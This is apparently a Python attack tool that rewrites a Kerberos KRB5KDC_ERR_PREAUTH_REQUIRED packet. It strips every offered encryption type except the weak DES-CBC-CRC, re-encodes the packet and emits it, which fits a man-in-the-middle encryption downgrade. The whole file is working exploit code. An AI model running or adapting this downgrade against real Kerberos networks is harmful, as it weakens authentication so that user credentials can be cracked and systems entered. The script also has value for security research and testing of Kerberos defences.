#!/usr/bin/env python

"""A tool for rewriting a KRB5KDC_ERR_PREAUTH_REQUIRED packet to downgrade to des-cbc-crc"""

import os
import sys
from pyasn1.codec.ber import decoder
from pyasn1.codec.der import encoder
from pyasn1.type import univ

__author__    = "David Hulton"
__license__   = "BSD"
__copyright__ = "Copyright 2016, David Hulton"

def main(argv):
	try:
		infile  = argv[0]
	except:
		print "usage: ./krb5-downgrade-preauth.py <infile>"
		sys.exit(0)

	fin  = open(infile, 'r')

	data = fin.read()
	data_len = len(data)
	fin.close()

	krb_preauth_req, temp = decoder.decode(data[4:])
	padata_seq, temp = decoder.decode(krb_preauth_req[7])

	new_enctype_info = univ.Sequence()
	for padata in padata_seq:
		if padata[0] == 19:
			enctype_info, temp = decoder.decode(padata[1])
			for enctype in enctype_info:
				if enctype[0] == 1:
					new_enctype_info.setComponentByPosition(0, enctype)
			padata[1] = univ.OctetString(encoder.encode(new_enctype_info))
	
	krb_preauth_req[7] = univ.OctetString(encoder.encode(padata_seq))

	payload_out = data[:4]
	payload_out += encoder.encode(krb_preauth_req)
	#payload_out = str(payload_out).ljust(data_len, '\0')

	
	# log what we're doing
	fout = open(infile +".in", "w")
	fout.write(data)
	fout.close()

	fout = open(infile +".out", "w")
	fout.write(payload_out)
	fout.close()

	sys.stdout.write(payload_out)
	os.remove(infile)

if __name__ == '__main__':
	main(sys.argv[1:])
